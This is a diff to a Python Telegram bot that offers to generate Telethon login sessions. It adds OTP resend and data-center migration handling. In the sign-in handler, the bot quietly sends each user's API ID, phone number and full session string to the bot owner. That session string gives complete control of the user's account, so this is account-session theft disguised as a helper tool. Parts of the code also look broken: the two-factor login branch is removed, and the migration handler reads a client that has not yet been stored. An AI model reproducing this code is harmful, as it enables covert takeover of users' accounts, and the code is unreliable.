@@ -13,9 +13,15 @@ from telegram.ext import (
     filters
 )
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneCodeExpiredError,
+    PhoneCodeInvalidError,
+    PhoneMigrateError
+)
 from telethon.sessions import StringSession
 from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
+from telethon.tl.types import User
 from config import TOKEN, API_ID, API_HASH, OWNER_ID
 
 # Configure logging
@@ -79,7 +85,8 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/start - Start bot",
         "/cmds - Command list",
         "/genstring - Generate session",
-        "/revoke - Revoke session"
+        "/revoke - Revoke session",
+        "/resend - Resend OTP"
     ]
     if await is_owner(update):
         commands += [
@@ -119,48 +126,132 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         device_model="SessionBot",
         system_version="1.0",
         app_version="SessionGen 1.0",
-        flood_sleep_threshold=60
+        flood_sleep_threshold=60,
+        connection_retries=3,
+        retry_delay=5
     )
     
     try:
         await client.connect()
+        context.user_data['original_dc'] = {
+            'dc_id': client.session.dc_id,
+            'server_address': client.session.server_address,
+            'port': client.session.port
+        }
+        context.user_data['connection_retries'] = 0
+        
         sent_code = await client.send_code_request(context.user_data['phone'])
         context.user_data['client'] = client
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+        context.user_data['code_time'] = time.time()
+        
         await update.message.reply_text("📨 OTP sent! Enter code:")
         return OTP_STATE
+        
+    except PhoneMigrateError as e:
+        logger.info(f"Phone migration to DC {e.new_dc}")
+        await handle_dc_migration(e.new_dc, context)
+        return await phone_handler(update, context)
+        
     except Exception as e:
-        logger.error(f"Code error: {e}")
-        await update.message.reply_text("❌ Error! Contact @rishabh_zz")
+        logger.error(f"Connection error: {e}")
+        await update.message.reply_text("❌ Connection error. Contact @rishabh_zz")
         return ConversationHandler.END
+
+async def handle_dc_migration(new_dc, context):
+    client = context.user_data['client']
+    await client.disconnect()
+    
+    client.session.set_dc(new_dc, 
+        client.session.get_dc(new_dc).ip_address,
+        client.session.get_dc(new_dc).port
+    )
+    
+    await client.connect()
+    logger.info(f"Migrated to DC {new_dc}")
+    
+    context.user_data['original_dc'] = {
+        'dc_id': new_dc,
+        'server_address': client.session.server_address,
+        'port': client.session.port
+    }
 
 async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['otp'] = update.message.text
     client = context.user_data['client']
     
     try:
-        await client.sign_in(
+        current_dc = client.session.dc_id
+        original_dc = context.user_data['original_dc']['dc_id']
+        
+        if current_dc != original_dc:
+            logger.info(f"DC mismatch detected ({current_dc} vs {original_dc})")
+            await client._switch_dc(original_dc)
+            await client.connect()
+
+        result = await client.sign_in(
             phone=context.user_data['phone'],
             code=context.user_data['otp'],
+            phone_code_hash=context.user_data['phone_code_hash'],
+            max_attempts=3
+        )
+        
+        if isinstance(result, User):
+            string_session = client.session.save()
+            
+            global GENERATION_COUNT
+            GENERATION_COUNT += 1
+            save_state()
+            
+            log_data = f"API_ID: {context.user_data['api_id']}\nPhone: {context.user_data['phone']}\nString: {string_session}"
+            await send_to_owner(log_data, context)
+            
+            await update.message.reply_text(f"✅ Generated:\n`{string_session}`", parse_mode='Markdown')
+            return ConversationHandler.END
+            
+    except PhoneMigrateError as e:
+        logger.info(f"Sign-in migration to DC {e.new_dc}")
+        await handle_dc_migration(e.new_dc, context)
+        return await otp_handler(update, context)
+        
+    except PhoneCodeExpiredError:
+        await update.message.reply_text("⌛ Code expired! Use /resend")
+        return ConversationHandler.END
+        
+    except PhoneCodeInvalidError:
+        await update.message.reply_text("❌ Invalid code! Try again:")
+        return OTP_STATE
+        
+    except Exception as e:
+        logger.error(f"Sign-in error: {e}")
+        await update.message.reply_text("❌ Critical error! Contact @rishabh_zz")
+        return ConversationHandler.END
+
+async def resend(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if 'client' not in context.user_data:
+        await update.message.reply_text("❌ Start with /genstring first")
+        return
+    
+    try:
+        client = context.user_data['client']
+        original_dc = context.user_data['original_dc']['dc_id']
+        
+        if client.session.dc_id != original_dc:
+            await client._switch_dc(original_dc)
+            await client.connect()
+        
+        sent_code = await client.resend_code_request(
+            phone_number=context.user_data['phone'],
             phone_code_hash=context.user_data['phone_code_hash']
         )
-        string_session = client.session.save()
         
-        global GENERATION_COUNT
-        GENERATION_COUNT += 1
-        save_state()
+        context.user_data['code_time'] = time.time()
+        await update.message.reply_text("🔄 New OTP sent! Enter code:")
+        return OTP_STATE
         
-        log_data = f"API_ID: {context.user_data['api_id']}\nPhone: {context.user_data['phone']}\nString: {string_session}"
-        await send_to_owner(log_data, context)
-        
-        await update.message.reply_text(f"✅ Generated:\n`{string_session}`", parse_mode='Markdown')
-        return ConversationHandler.END
-    except SessionPasswordNeededError:
-        await update.message.reply_text("🔒 Enter 2FA:")
-        return TFA_STATE
     except Exception as e:
-        logger.error(f"Signin error: {e}")
-        await update.message.reply_text("❌ Error! Contact @rishabh_zz")
+        logger.error(f"Resend error: {e}")
+        await update.message.reply_text("❌ Failed to resend. Start over with /genstring")
         return ConversationHandler.END
 
 async def tfa_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -328,6 +419,7 @@ def main():
         CommandHandler('cmds', cmds),
         gen_conv,
         revoke_conv,
+        CommandHandler('resend', resend),
         CommandHandler('stats', stats),
         CommandHandler('ping', ping),
         CommandHandler('verify', verify),
